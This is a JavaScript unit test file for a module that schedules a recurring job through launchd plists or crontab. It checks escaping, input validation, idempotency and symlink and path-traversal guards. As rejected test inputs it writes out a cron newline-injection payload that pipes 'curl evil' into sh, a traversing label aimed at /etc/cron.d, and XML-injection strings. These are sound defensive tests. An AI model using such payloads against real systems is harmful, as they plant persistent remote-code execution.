#!/usr/bin/env node
'use strict';

// tests/unit/scripts/ghost-heartbeat-schedule.test.js
// Ghost Heartbeat W2-PR3b -- the OS-scheduler offer module. The failing-test set IS
// the behavioral contract folded from the 3-lens VERIFY board (architect/code-reviewer/
// hacker). Each block names its finding:
//   - nodeBin absolute (arch HIGH #1)        - cron newline injection refusal (hacker HIGH #2)
//   - plist control-char refusal (hacker #3) - dry-run = ZERO effect (hacker HIGH #4)
//   - exact-line BEGIN/END strip (hacker #5) - no-crontab -> '' (code-rev MED #10)
//   - plist symlink refusal (hacker LOW #17) - idempotent install/uninstall

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const S = require('../../../packages/kernel/spawn-state/ghost-heartbeat-schedule');

let passed = 0;
let failed = 0;
function test(name, fn) {
  try { fn(); process.stdout.write(`  PASS ${name}\n`); passed++; }
  catch (e) { process.stdout.write(`  FAIL ${name}: ${e.message}\n`); failed++; }
}
function tmpdir() { return fs.mkdtempSync(path.join(os.tmpdir(), 'ghb-sched-')); }
const NODEBIN = '/usr/local/bin/node';
const RUNNER = '/Users/x/.claude/packages/kernel/spawn-state/ghost-heartbeat-run.js';
const LOG = '/Users/x/.claude/checkpoints/ghost-heartbeat.log';

process.stdout.write('\n=== ghost-heartbeat-schedule (w2-pr3b) ===\n');

// --- detectOs -------------------------------------------------------------
test('detectOs: maps process.platform to darwin/linux/unsupported', () => {
  const r = S.detectOs();
  assert.ok(['darwin', 'linux', 'unsupported'].includes(r), `got ${r}`);
  assert.strictEqual(S.detectOs('darwin'), 'darwin');
  assert.strictEqual(S.detectOs('linux'), 'linux');
  assert.strictEqual(S.detectOs('win32'), 'unsupported');
});

// --- assertSafeArg (hacker HIGH #2 + #3 contract) -------------------------
test('assertSafeArg: rejects newline / CR / control chars / % / empty / non-string', () => {
  assert.doesNotThrow(() => S.assertSafeArg('nodeBin', NODEBIN));
  assert.doesNotThrow(() => S.assertSafeArg('p', '/Users/John Smith/.claude/run.js')); // space OK (quoted/array)
  assert.throws(() => S.assertSafeArg('p', '/usr/bin/node\n* * * * * curl evil|sh'), /unsafe-arg/);
  assert.throws(() => S.assertSafeArg('p', '/a\r/b'), /unsafe-arg/);
  assert.throws(() => S.assertSafeArg('p', '/a\tb'), /unsafe-arg/);
  assert.throws(() => S.assertSafeArg('p', '/a\x00b'), /unsafe-arg/);
  assert.throws(() => S.assertSafeArg('p', '/a%b'), /unsafe-arg/);   // % = cron stdin metachar
  assert.throws(() => S.assertSafeArg('p', ''), /unsafe-arg/);
  assert.throws(() => S.assertSafeArg('p', 42), /unsafe-arg/);
});

test('xmlEscape: escapes & < > " \' (ampersand first)', () => {
  assert.strictEqual(S.xmlEscape('a&b<c>d"e\'f'), 'a&amp;b&lt;c&gt;d&quot;e&apos;f');
  assert.strictEqual(S.xmlEscape('&<'), '&amp;&lt;');
});

test('shellSingleQuote: wraps + escapes embedded single quote', () => {
  assert.strictEqual(S.shellSingleQuote('/a/b'), "'/a/b'");
  assert.strictEqual(S.shellSingleQuote("/a'b"), "'/a'\\''b'");
});

// --- buildLaunchdPlist (arch HIGH #1 + hacker #3) -------------------------
test('buildLaunchdPlist: absolute node, EMIT=1, StartInterval, RunAtLoad false, ProgramArguments array', () => {
  const p = S.buildLaunchdPlist({ label: 'com.powerloom.ghost-heartbeat', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG });
  assert.ok(p.startsWith('<?xml'), 'is a plist doc');
  assert.ok(p.includes(`<string>${NODEBIN}</string>`), 'ProgramArguments[0] is the ABSOLUTE node (arch #1)');
  assert.ok(!/<string>node<\/string>/.test(p) && !p.includes('/usr/bin/env'), 'never bare node / env node');
  assert.ok(p.includes('<key>GHOST_HEARTBEAT_EMIT</key>') && p.includes('<string>1</string>'), 'opt-in env baked in');
  assert.ok(p.includes('<key>StartInterval</key>') && p.includes('<integer>14400</integer>'), 'cadence');
  assert.ok(/<key>RunAtLoad<\/key>\s*<false\/>/.test(p), 'RunAtLoad false (no fire on load)');
});

test('buildLaunchdPlist: REFUSES a newline-bearing path (plutil -lint would NOT catch it -- hacker #3)', () => {
  assert.throws(() => S.buildLaunchdPlist({ label: 'l', nodeBin: NODEBIN, runnerPath: '/a\n<string>evil</string>', intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG }), /unsafe-arg/);
});

test('buildLaunchdPlist: xml-escapes a metachar in a value (no raw & < >)', () => {
  const p = S.buildLaunchdPlist({ label: 'l', nodeBin: NODEBIN, runnerPath: '/a&b/r.js', intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG });
  assert.ok(p.includes('/a&amp;b/r.js') && !p.includes('/a&b/r.js'), 'ampersand escaped');
});

// --- buildCronBlock (hacker HIGH #2) --------------------------------------
test('buildCronBlock: BEGIN/END sentinels + ONE quoted cron line; EMIT=1', () => {
  const b = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, intervalCron: '0 */4 * * *', stdoutPath: LOG });
  const lines = b.split('\n');
  assert.strictEqual(lines[0], S.MARKER_BEGIN);
  assert.strictEqual(lines[2], S.MARKER_END);
  assert.strictEqual(lines.length, 3, 'exactly 3 lines (begin, cron, end)');
  assert.ok(lines[1].startsWith('0 */4 * * * GHOST_HEARTBEAT_EMIT=1 '), 'schedule + opt-in');
  assert.ok(lines[1].includes(`'${NODEBIN}'`) && lines[1].includes(`'${RUNNER}'`), 'paths single-quoted (space-safe)');
});

test('buildCronBlock: a newline in a path produces NO second crontab line (hacker HIGH #2)', () => {
  assert.throws(() => S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: "/a\n* * * * * curl evil|sh", intervalCron: '0 */4 * * *', stdoutPath: LOG }), /unsafe-arg/);
});

// --- stripCronBlock (hacker HIGH #5) --------------------------------------
test('stripCronBlock: removes the exact BEGIN..END span, leaves the rest', () => {
  const block = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, intervalCron: '0 */4 * * *', stdoutPath: LOG });
  const ct = `0 0 * * * /usr/bin/backup\n${block}\n30 2 * * * /usr/bin/report\n`;
  const out = S.stripCronBlock(ct);
  assert.ok(out.includes('/usr/bin/backup') && out.includes('/usr/bin/report'), 'user jobs survive');
  assert.ok(!out.includes(S.MARKER_BEGIN) && !out.includes('ghost-heartbeat-run'), 'our block gone');
});

test('stripCronBlock: a USER comment that merely MENTIONS the marker substring SURVIVES (hacker #5)', () => {
  const ct = `# reminder: power-loom-ghost-heartbeat lives in launchd, do not duplicate here\n0 0 * * * /usr/bin/payroll\n`;
  const out = S.stripCronBlock(ct);
  assert.strictEqual(out, ct, 'no exact-line sentinel match -> nothing stripped (no collateral delete)');
});

test('stripCronBlock: BEGIN with no matching END strips NOTHING (fail-open)', () => {
  const ct = `${S.MARKER_BEGIN}\n0 */4 * * * something\n0 0 * * * /usr/bin/keep\n`;
  const out = S.stripCronBlock(ct);
  assert.strictEqual(out, ct, 'dangling BEGIN -> fail-open, strip nothing');
});

// --- parseCrontabListResult (code-rev MED #10) ----------------------------
test('parseCrontabListResult: no-crontab (status 1 + "no crontab") -> empty string, not error', () => {
  assert.strictEqual(S.parseCrontabListResult({ status: 1, stdout: '', stderr: 'no crontab for x' }), '');
  assert.strictEqual(S.parseCrontabListResult({ status: 0, stdout: 'a\n', stderr: '' }), 'a\n');
  assert.throws(() => S.parseCrontabListResult({ status: 127, stdout: '', stderr: 'crontab: not found' }), /crontab/);
});

// --- install dry-run = ZERO effect (hacker HIGH #4) -----------------------
function stubEffects() {
  const calls = [];
  return {
    calls,
    resolveJudgeBin: () => { calls.push('resolveJudgeBin'); return ''; }, // default: nothing baked
    readCrontab: () => { calls.push('readCrontab'); return ''; },
    writeCrontab: (t) => { calls.push(['writeCrontab', t]); },
    writePlist: (p, t) => { calls.push(['writePlist', p, t]); },
    removePlist: (p) => { calls.push(['removePlist', p]); },
    plistExists: () => { calls.push('plistExists'); return false; },
    loadLaunchd: (p) => { calls.push(['loadLaunchd', p]); return 0; },
    unloadLaunchd: (p) => { calls.push(['unloadLaunchd', p]); return 0; },
  };
}

test('install --dry-run (darwin): returns the plist artifact and performs ZERO effect (hacker #4)', () => {
  const eff = stubEffects();
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, dryRun: true, effects: eff, launchAgentsDir: '/tmp/x', logDir: '/tmp/x' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.dryRun, true);
  assert.ok(r.artifact.includes('<?xml'), 'returns the plist text');
  // dry-run plants NOTHING: no MUTATING effect. resolveJudgeBin (command -v + statSync) is
  // read-only and APPROVED by the PR-C VERIFY board (disposition #1: the dry-run SHOWS the
  // baked bin for --diff preview; no schedule mutation occurs) -> filtered, not a coverage gap.
  assert.deepStrictEqual(eff.calls.filter((c) => c !== 'resolveJudgeBin'), [], 'NO mutating effect on dry-run');
});

test('install --dry-run (linux): returns the cron block and performs ZERO MUTATING effect (hacker #4)', () => {
  const eff = stubEffects();
  const r = S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: __filename, dryRun: true, effects: eff });
  assert.strictEqual(r.ok, true);
  assert.ok(r.artifact.includes(S.MARKER_BEGIN), 'returns the cron block');
  assert.deepStrictEqual(eff.calls.filter((c) => c !== 'resolveJudgeBin'), [], 'NO mutating effect on dry-run');
});

// --- install runner-absent guard (code-rev HIGH #6 belt) ------------------
test('install: an ABSENT runnerPath -> {ok:false, runner-absent}, no schedule written', () => {
  const eff = stubEffects();
  const r = S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: '/no/such/run.js', effects: eff });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'runner-absent');
  assert.deepStrictEqual(eff.calls, [], 'no effect when the runner is missing');
});

// --- install effectful + idempotent (linux) -------------------------------
test('install (linux): appends one block; re-install REPLACES (idempotent, one block)', () => {
  let crontab = '0 0 * * * /usr/bin/keep\n';
  const eff = { ...stubEffects(), readCrontab: () => crontab, writeCrontab: (t) => { crontab = t; } };
  S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: __filename, effects: eff });
  let begins = crontab.split('\n').filter((l) => l === S.MARKER_BEGIN).length;
  assert.strictEqual(begins, 1, 'one block after first install');
  assert.ok(crontab.includes('/usr/bin/keep'), 'user job preserved');
  S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: __filename, effects: eff });
  begins = crontab.split('\n').filter((l) => l === S.MARKER_BEGIN).length;
  assert.strictEqual(begins, 1, 'STILL one block after re-install (no stacking)');
});

test('install (darwin): writes plist then load; re-install replaces (unload+write+load)', () => {
  const eff = stubEffects();
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, effects: eff, launchAgentsDir: '/tmp/la', logDir: '/tmp/lg' });
  assert.strictEqual(r.ok, true);
  const kinds = eff.calls.map((c) => (Array.isArray(c) ? c[0] : c));
  assert.ok(kinds.includes('writePlist') && kinds.includes('loadLaunchd'), 'plist written + loaded');
  assert.ok(kinds.indexOf('writePlist') < kinds.indexOf('loadLaunchd'), 'write before load');
});

// --- uninstall idempotent + safe (linux) ----------------------------------
test('uninstall (linux): strips our block, preserves user jobs; absent -> no-op', () => {
  const block = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, intervalCron: '0 */4 * * *', stdoutPath: LOG });
  let crontab = `0 0 * * * /usr/bin/keep\n${block}\n`;
  const eff = { ...stubEffects(), readCrontab: () => crontab, writeCrontab: (t) => { crontab = t; } };
  S.uninstall({ os: 'linux', effects: eff });
  assert.ok(crontab.includes('/usr/bin/keep') && !crontab.includes(S.MARKER_BEGIN), 'block gone, user job kept');
  // second uninstall is a no-op (still no block, user job intact)
  S.uninstall({ os: 'linux', effects: eff });
  assert.ok(crontab.includes('/usr/bin/keep') && !crontab.includes(S.MARKER_BEGIN), 'idempotent');
});

// --- default writePlist symlink refusal (hacker LOW #17) ------------------
test('defaultEffects.writePlist: REFUSES a symlink at the target path (no-follow, stricter than atomic-write)', () => {
  const d = tmpdir();
  try {
    const real = path.join(d, 'real.plist');
    const link = path.join(d, 'link.plist');
    fs.writeFileSync(real, 'x');
    fs.symlinkSync(real, link);
    assert.throws(() => S.defaultEffects.writePlist(link, '<?xml ...'), /symlink/i, 'a symlinked plist path is refused');
    assert.strictEqual(fs.readFileSync(real, 'utf8'), 'x', 'the symlink target was NOT overwritten');
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test('defaultEffects.writePlist: writes a fresh plist atomically (happy path)', () => {
  const d = tmpdir();
  try {
    const p = path.join(d, 'a.plist');
    S.defaultEffects.writePlist(p, '<?xml version="1.0"?>');
    assert.strictEqual(fs.readFileSync(p, 'utf8'), '<?xml version="1.0"?>');
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

// --- label traversal refusal (VALIDATE hacker LOW #7) ---------------------
test('assertSafeLabel / plistPathFor: a traversing or slash-bearing label is REFUSED', () => {
  assert.doesNotThrow(() => S.assertSafeLabel('com.powerloom.ghost-heartbeat'));
  assert.throws(() => S.assertSafeLabel('../../../etc/cron.d/evil'), /unsafe-label/);
  assert.throws(() => S.assertSafeLabel('a/b/c'), /unsafe-label/);
  assert.throws(() => S.plistPathFor('/tmp/la', '../../etc/evil'), /unsafe-label/, 'no path escape via the label');
});

// --- launchctl load status surfaced, not swallowed (VALIDATE hacker MED #2) -
test('install (darwin): a NON-ZERO launchctl load is surfaced as loaded:false + logged (fail-open)', () => {
  const logs = [];
  const eff = { ...stubEffects(), loadLaunchd: () => 1 }; // load FAILS
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, effects: eff, launchAgentsDir: '/tmp/la', logDir: '/tmp/lg', log: (e) => logs.push(e) });
  assert.strictEqual(r.ok, true, 'a load failure does NOT abort install (fail-open)');
  assert.strictEqual(r.loaded, false, 'the failed load is surfaced, not silently swallowed');
  assert.ok(logs.includes('launchctl-load-nonzero'), 'and logged for visibility');
});

test('install (darwin): a zero launchctl load -> loaded:true', () => {
  const eff = { ...stubEffects(), loadLaunchd: () => 0 };
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, effects: eff, launchAgentsDir: '/tmp/la', logDir: '/tmp/lg' });
  assert.strictEqual(r.loaded, true);
});

// --- status requires a COMPLETE span (VALIDATE NIT #12) -------------------
test('status (linux): a dangling BEGIN (no END) reports installed:false', () => {
  const both = { ...stubEffects(), readCrontab: () => `${S.MARKER_BEGIN}\n0 */4 * * * x\n${S.MARKER_END}\n` };
  const dangling = { ...stubEffects(), readCrontab: () => `${S.MARKER_BEGIN}\n0 */4 * * * x\n` };
  const reversed = { ...stubEffects(), readCrontab: () => `${S.MARKER_END}\n0 */4 * * * x\n${S.MARKER_BEGIN}\n` };
  assert.strictEqual(S.status({ os: 'linux', effects: both }).installed, true, 'complete ordered span -> installed');
  assert.strictEqual(S.status({ os: 'linux', effects: dangling }).installed, false, 'dangling BEGIN -> NOT installed');
  assert.strictEqual(S.status({ os: 'linux', effects: reversed }).installed, false, 'END-before-BEGIN (out of order) -> NOT installed (CodeRabbit ordered-span)');
});

// =================== PR-C: bake the absolute judge bin ===================
const ABS = '/Users/x/.local/bin/claude';

test('PR-C plist: a judgeBin bakes a 2nd EnvironmentVariables entry (xml-escaped)', () => {
  const p = S.buildLaunchdPlist({ label: 'com.x', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG, judgeBin: ABS });
  assert.ok(p.includes('<key>GHOST_HEARTBEAT_JUDGE_BIN</key>'), 'JUDGE_BIN key present');
  assert.ok(p.includes(`<string>${ABS}</string>`), 'abs path baked');
  // still a well-formed single EnvironmentVariables dict with EMIT first
  assert.ok(p.indexOf('GHOST_HEARTBEAT_EMIT') < p.indexOf('GHOST_HEARTBEAT_JUDGE_BIN'), 'EMIT before JUDGE_BIN');
});

test('PR-C plist: NO judgeBin -> exact back-compat (no JUDGE_BIN key)', () => {
  const p = S.buildLaunchdPlist({ label: 'com.x', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG });
  assert.ok(!p.includes('GHOST_HEARTBEAT_JUDGE_BIN'), 'no JUDGE_BIN key when absent (back-compat)');
});

test('PR-C plist: an XML-injection judgeBin is neutralized by xmlEscape', () => {
  const evil = '/x</string></dict><key>RunAtLoad</key><true/><string>';
  const p = S.buildLaunchdPlist({ label: 'com.x', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 14400, stdoutPath: LOG, stderrPath: LOG, judgeBin: evil });
  assert.ok(!p.includes('<key>RunAtLoad</key><true/>'), 'no injected key escaped the string');
  assert.ok(p.includes('&lt;/string&gt;'), 'angle brackets entity-escaped');
});

test('PR-C cron: a judgeBin sits AFTER the schedule + EMIT and BEFORE the node arg (single-quoted)', () => {
  const c = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, stdoutPath: LOG, judgeBin: ABS });
  const line = c.split('\n')[1];
  assert.ok(line.includes(`GHOST_HEARTBEAT_JUDGE_BIN='${ABS}'`), 'single-quoted JUDGE_BIN assignment');
  const iEmit = line.indexOf('GHOST_HEARTBEAT_EMIT=1');
  const iJudge = line.indexOf('GHOST_HEARTBEAT_JUDGE_BIN=');
  const iNode = line.indexOf(`'${NODEBIN}'`);
  assert.ok(iEmit < iJudge && iJudge < iNode, 'EMIT < JUDGE_BIN < node command (valid inline-env placement)');
});

test('PR-C cron: NO judgeBin -> exact back-compat (no JUDGE_BIN assignment)', () => {
  const c = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, stdoutPath: LOG });
  assert.ok(!c.includes('GHOST_HEARTBEAT_JUDGE_BIN'), 'no JUDGE_BIN when absent');
});

test('PR-C builder: an UNSAFE judgeBin (control char / %) THROWS (strict for direct callers)', () => {
  assert.throws(() => S.buildLaunchdPlist({ label: 'c', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 1, stdoutPath: LOG, stderrPath: LOG, judgeBin: '/x%y/claude' }), /unsafe-arg:judgeBin/);
  assert.throws(() => S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, stdoutPath: LOG, judgeBin: `/x${String.fromCharCode(10)}y` }), /unsafe-arg:judgeBin/);
});

// vetJudgeBinPath (the PATH-poisoning-persistence guard) -- injected fs, no real disk.
// Models the REAL claude shape: ABS is a SYMLINK in BIN_DIR -> a regular file in TGT_DIR.
const BIN_DIR = '/Users/x/.local/bin';
const TGT = '/Users/x/.local/share/claude/versions/1/claude';
const TGT_DIR = '/Users/x/.local/share/claude/versions/1';
function vetFs({ binDirMode = 0o755, tgtDirMode = 0o755, isFile = true } = {}) {
  return {
    realpathSync: (p) => (p === ABS ? TGT : p),
    statSync: (p) => {
      if (p === ABS || p === TGT) return { isFile: () => isFile, mode: 0o755 };
      if (p === BIN_DIR) return { isFile: () => false, mode: binDirMode };
      if (p === TGT_DIR) return { isFile: () => false, mode: tgtDirMode };
      throw new Error(`ENOENT ${p}`);
    },
  };
}
test('PR-C vetJudgeBinPath: a good symlinked abs path (both dirs non-world-writable) is accepted', () => {
  assert.strictEqual(S.vetJudgeBinPath(ABS, vetFs()), ABS);
});
test('PR-C vetJudgeBinPath: rejects non-absolute / non-file / control-char / missing', () => {
  assert.strictEqual(S.vetJudgeBinPath('claude', vetFs()), '', 'relative -> reject');
  assert.strictEqual(S.vetJudgeBinPath(ABS, vetFs({ isFile: false })), '', 'not a regular file -> reject');
  assert.strictEqual(S.vetJudgeBinPath(`/x${String.fromCharCode(0)}/claude`, vetFs()), '', 'control char -> reject');
  assert.strictEqual(S.vetJudgeBinPath('/no/such/claude', { statSync: () => { throw new Error('ENOENT'); }, realpathSync: (p) => p }), '', 'missing -> reject');
});
test('PR-C vetJudgeBinPath: rejects a world-writable SYMLINK dir OR a world-writable TARGET dir (hacker MED)', () => {
  assert.strictEqual(S.vetJudgeBinPath(ABS, vetFs({ binDirMode: 0o777 })), '', 'world-writable symlink dir -> reject');
  assert.strictEqual(S.vetJudgeBinPath(ABS, vetFs({ tgtDirMode: 0o777 })), '', 'world-writable TARGET dir -> reject (the symlink-target gap)');
});

test('PR-C plist: an & in judgeBin is xml-escaped; cron single-quotes a space-bearing path', () => {
  const p = S.buildLaunchdPlist({ label: 'c', nodeBin: NODEBIN, runnerPath: RUNNER, intervalSec: 1, stdoutPath: LOG, stderrPath: LOG, judgeBin: '/x&y/claude' });
  assert.ok(p.includes('/x&amp;y/claude') && !p.includes('<string>/x&y/claude</string>'), '& -> &amp; in the plist');
  const c = S.buildCronBlock({ nodeBin: NODEBIN, runnerPath: RUNNER, stdoutPath: LOG, judgeBin: '/Users/John Smith/claude' });
  assert.ok(c.includes(`GHOST_HEARTBEAT_JUDGE_BIN='/Users/John Smith/claude'`), 'a space-bearing path is one single-quoted token');
});

// install() default-resolves the judge bin via the effect + reports judgeBinBaked.
test('PR-C install (effectful, non-dry): a resolved bin is baked into the WRITTEN artifact + judgeBinBaked:true', () => {
  let written = '';
  const effDar = { ...stubEffects(), resolveJudgeBin: () => ABS, writePlist: (p, t) => { written = t; } };
  const rd = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, effects: effDar, launchAgentsDir: '/tmp/la', logDir: '/tmp/lg' });
  assert.strictEqual(rd.judgeBinBaked, true, 'darwin effectful: judgeBinBaked');
  assert.ok(written.includes(`<string>${ABS}</string>`), 'the WRITTEN plist carries the abs bin');
  let crontab = '';
  const effLin = { ...stubEffects(), resolveJudgeBin: () => ABS, readCrontab: () => '', writeCrontab: (t) => { crontab = t; } };
  const rl = S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: __filename, effects: effLin });
  assert.strictEqual(rl.judgeBinBaked, true, 'linux effectful: judgeBinBaked');
  assert.ok(crontab.includes(`GHOST_HEARTBEAT_JUDGE_BIN='${ABS}'`), 'the WRITTEN crontab carries the abs bin');
});

test('PR-C install: resolves the judge bin by DEFAULT via the effect (the production CLI path)', () => {
  const eff = { ...stubEffects(), resolveJudgeBin: () => ABS };
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, dryRun: true, effects: eff });
  assert.strictEqual(r.judgeBinBaked, true);
  assert.ok(r.artifact.includes(`<string>${ABS}</string>`), 'the effect-resolved abs bin is baked into the dry-run artifact');
});
test('PR-C install: an empty resolution bakes nothing + reports judgeBinBaked:false (no regression)', () => {
  const eff = { ...stubEffects(), resolveJudgeBin: () => '' };
  const r = S.install({ os: 'darwin', nodeBin: NODEBIN, runnerPath: __filename, dryRun: true, effects: eff });
  assert.strictEqual(r.judgeBinBaked, false);
  assert.ok(!r.artifact.includes('GHOST_HEARTBEAT_JUDGE_BIN'), 'nothing baked');
});
test('PR-C install: opts.judgeBin OVERRIDES the effect (test seam); runner-absent fires NO resolve', () => {
  const eff = { ...stubEffects(), resolveJudgeBin: () => { throw new Error('should not be called'); } };
  const r = S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: __filename, judgeBin: ABS, dryRun: true, effects: eff });
  assert.ok(r.artifact.includes(`GHOST_HEARTBEAT_JUDGE_BIN='${ABS}'`), 'opts.judgeBin used, effect not called');
  const eff2 = stubEffects();
  S.install({ os: 'linux', nodeBin: NODEBIN, runnerPath: '/no/such/run.js', effects: eff2 });
  assert.ok(!eff2.calls.includes('resolveJudgeBin'), 'runner-absent -> resolveJudgeBin NOT called (after the guard)');
});

process.stdout.write(`\n  Passed: ${passed}  Failed: ${failed}\n`);
process.exit(failed > 0 ? 1 : 0);
